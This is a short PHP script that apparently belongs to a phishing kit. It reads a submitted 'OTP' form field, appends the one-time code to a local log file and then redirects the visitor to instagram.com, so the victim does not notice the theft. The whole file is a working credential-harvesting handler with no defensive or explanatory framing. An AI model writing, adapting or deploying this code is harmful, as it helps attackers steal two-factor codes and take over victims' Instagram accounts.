<?php

file_put_contents("log.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com');
exit();
